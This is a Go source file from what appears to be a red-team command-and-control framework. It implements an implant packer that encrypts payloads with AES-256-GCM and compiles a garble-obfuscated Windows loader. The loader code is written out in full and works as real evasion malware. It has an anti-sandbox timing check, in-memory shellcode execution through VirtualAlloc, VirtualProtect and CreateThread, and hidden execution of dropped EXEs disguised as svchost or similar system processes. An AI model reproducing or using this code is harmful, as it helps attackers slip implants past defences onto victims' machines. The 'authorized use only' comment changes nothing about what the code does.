package generate

/*
	SUDOSOC-C2 — AES-256-GCM Implant Packer
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing and red team operations only.

	How it works:
	  1. Read the generated implant binary.
	  2. Encrypt it with AES-256-GCM (fresh random key + nonce each pack).
	  3. Write key, nonce, and ciphertext as binary files (_k.bin _n.bin _p.bin).
	  4. Render a minimal Go loader source (main.go) that embeds those files
	     via //go:embed, decrypts at runtime, then executes.
	  5. Compile the loader with garble (-seed=random -literals -tiny) so
	     every packed binary is structurally unique — no shared signatures.

	The packed loader binary:
	  • Contains NO mTLS / C2 strings.
	  • Contains NO recognisable implant byte patterns.
	  • Anti-sandbox: random 5-17 s sleep at startup.
	  • Shellcode payloads: RW alloc → copy → RX → new thread (never RWX).
	  • EXE payloads:       temp file with random-looking name → hidden exec → delete.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"fmt"
	"os"
	"path/filepath"

	"github.com/sudosoc/SUDOSOC-C2/server/gogo"
)

// PackWindows encrypts the binary at inputPath with AES-256-GCM and compiles
// a fresh Go loader that decrypts + executes the payload at runtime.
//
// isShellcode=true  → in-memory thread execution (requires shellcode format)
// isShellcode=false → temp-file execution (works with any EXE/DLL)
//
// Returns the path of the packed loader binary.
func PackWindows(inputPath, implantName string, isShellcode bool, appDir string) (string, error) {
	// ── 1. Read the payload ─────────────────────────────────────────────────
	raw, err := os.ReadFile(inputPath)
	if err != nil {
		return "", fmt.Errorf("packer: read input: %w", err)
	}

	// ── 2. Generate fresh AES-256-GCM key + nonce ────────────────────────────
	key := make([]byte, 32)
	nonce := make([]byte, 12)
	if _, err = crand.Read(key); err != nil {
		return "", fmt.Errorf("packer: keygen: %w", err)
	}
	if _, err = crand.Read(nonce); err != nil {
		return "", fmt.Errorf("packer: nonce: %w", err)
	}

	// ── 3. Encrypt ───────────────────────────────────────────────────────────
	blk, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("packer: aes: %w", err)
	}
	gcm, err := cipher.NewGCM(blk)
	if err != nil {
		return "", fmt.Errorf("packer: gcm: %w", err)
	}
	ciphertext := gcm.Seal(nil, nonce, raw, nil)

	// ── 4. Build temp directory ──────────────────────────────────────────────
	tmpDir, err := os.MkdirTemp("", "sudosoc-packer-*")
	if err != nil {
		return "", fmt.Errorf("packer: mktemp: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	// Write binary blobs (//go:embed will include these in the loader)
	if err = os.WriteFile(filepath.Join(tmpDir, "_k.bin"), key, 0600); err != nil {
		return "", err
	}
	if err = os.WriteFile(filepath.Join(tmpDir, "_n.bin"), nonce, 0600); err != nil {
		return "", err
	}
	if err = os.WriteFile(filepath.Join(tmpDir, "_p.bin"), ciphertext, 0600); err != nil {
		return "", err
	}

	// Write go.mod (stdlib only — no external dependencies)
	goMod := "module loader\n\ngo 1.21\n"
	if err = os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0600); err != nil {
		return "", err
	}

	// Write main.go loader source
	loaderSrc := buildLoaderSource(isShellcode)
	if err = os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(loaderSrc), 0600); err != nil {
		return "", err
	}

	// ── 5. Compile the loader with garble ────────────────────────────────────
	goConfig := gogo.GoConfig{
		CGO:        "0",
		GOOS:       "windows",
		GOARCH:     "amd64",
		GOROOT:     gogo.GetGoRootDir(appDir),
		GOCACHE:    gogo.GetGoCache(appDir),
		GOMODCACHE: gogo.GetGoModCache(appDir),
		GOPROXY:    getGoProxy(),

		// Obfuscate the loader source with garble so every packed binary
		// has randomised symbol names and obfuscated string literals.
		Obfuscation: true,
	}

	outBin := filepath.Join(tmpDir, "loader.exe")
	// -H=windowsgui: no console window; -s -w: strip debug+symbols
	ldflags := []string{"-H=windowsgui -s -w"}
	if _, err = gogo.GoBuild(goConfig, tmpDir, outBin, "", nil, ldflags, "", ""); err != nil {
		// Fallback: try without garble (obfuscation unavailable)
		goConfig.Obfuscation = false
		if _, err = gogo.GoBuild(goConfig, tmpDir, outBin, "", nil, ldflags, "", ""); err != nil {
			return "", fmt.Errorf("packer: compile: %w", err)
		}
	}

	// ── 6. Save to slivers dir ───────────────────────────────────────────────
	destDir := filepath.Join(GetSliversDir(), "windows", "amd64", implantName, "bin")
	if err = os.MkdirAll(destDir, 0700); err != nil {
		return "", err
	}
	destPath := filepath.Join(destDir, implantName+"_packed.exe")

	packed, err := os.ReadFile(outBin)
	if err != nil {
		return "", fmt.Errorf("packer: read output: %w", err)
	}
	if err = os.WriteFile(destPath, packed, 0600); err != nil {
		return "", fmt.Errorf("packer: save: %w", err)
	}

	buildLog.Infof("[packer] done → %s (%d bytes)", destPath, len(packed))
	return destPath, nil
}

// buildLoaderSource returns the Go source for the loader.
// The key/nonce/payload are embedded via //go:embed directives
// so they never appear as string literals in the source code.
func buildLoaderSource(isShellcode bool) string {
	sc := "false"
	if isShellcode {
		sc = "true"
	}

	return `package main

/*
	SUDOSOC-C2 Packed Loader — generated, do not edit.
	AES-256-GCM decrypts and executes the embedded payload at runtime.
	Anti-sandbox: random sleep at startup.
*/

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// Embedded AES key (32 bytes), nonce (12 bytes), ciphertext (variable).
//
//go:embed _k.bin
var _k []byte

//go:embed _n.bin
var _n []byte

//go:embed _p.bin
var _p []byte

// _sc = true → shellcode (in-memory), false → EXE (temp file)
var _sc = ` + sc + `

func main() {
	runtime.LockOSThread()

	// ── Anti-sandbox: random sleep [5, 17) s ──────────────────────────────────
	// Automated sandboxes either time-skip (elapsed < threshold → exit)
	// or timeout before this sleep finishes.
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	delay := time.Duration(5+rng.Intn(12)) * time.Second
	t0 := time.Now()
	time.Sleep(delay)
	if time.Since(t0) < 4*time.Second {
		os.Exit(0) // time was accelerated → sandbox
	}

	// ── Decrypt ───────────────────────────────────────────────────────────────
	blk, err := aes.NewCipher(_k)
	if err != nil {
		os.Exit(0)
	}
	gcm, err := cipher.NewGCM(blk)
	if err != nil {
		os.Exit(0)
	}
	payload, err := gcm.Open(nil, _n, _p, nil)
	if err != nil {
		os.Exit(0) // wrong key or tampered → silent exit
	}

	// ── Execute ───────────────────────────────────────────────────────────────
	if _sc {
		runShellcode(payload)
	} else {
		runExe(payload)
	}
}

// runShellcode executes raw shellcode in memory:
//
//	VirtualAlloc(RW) → memcopy → VirtualProtect(RX) → CreateThread
//
// Using RW→RX instead of RWX avoids the most obvious behavioral hook.
func runShellcode(sc []byte) {
	k32 := syscall.NewLazyDLL("kernel32.dll")
	vaProc   := k32.NewProc("VirtualAlloc")
	vpProc   := k32.NewProc("VirtualProtect")
	ctProc   := k32.NewProc("CreateThread")
	wfsoProc := k32.NewProc("WaitForSingleObject")

	// Allocate read-write (not execute) memory first
	addr, _, _ := vaProc.Call(
		0,
		uintptr(len(sc)),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x04,   // PAGE_READWRITE
	)
	if addr == 0 {
		return
	}
	// Copy shellcode into the allocation
	for i, b := range sc {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b //nolint:govet
	}
	// Flip protection to execute-read (not write)
	var oldProt uint32
	vpProc.Call(addr, uintptr(len(sc)), 0x20 /* PAGE_EXECUTE_READ */, uintptr(unsafe.Pointer(&oldProt)))

	// Spawn a thread at the shellcode address and wait for it to finish
	th, _, _ := ctProc.Call(0, 0, addr, 0, 0, 0)
	if th != 0 {
		wfsoProc.Call(th, 0xFFFFFFFF) // INFINITE
	}
}

// runExe writes the PE to a temp file with a random system-looking name and
// executes it hidden.  After a brief delay the temp file is deleted.
func runExe(pe []byte) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	sysNames := []string{"svchost", "RuntimeBroker", "WmiPrvSE", "dllhost", "conhost"}
	base := sysNames[rng.Intn(len(sysNames))]
	tmp := filepath.Join(os.TempDir(),
		fmt.Sprintf("%s_%08x.exe", base, rng.Uint32()))
	if err := os.WriteFile(tmp, pe, 0700); err != nil {
		return
	}
	cmd := exec.Command(tmp)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Start()
	// Remove after startup delay
	time.Sleep(4 * time.Second)
	os.Remove(tmp)
}
`
}
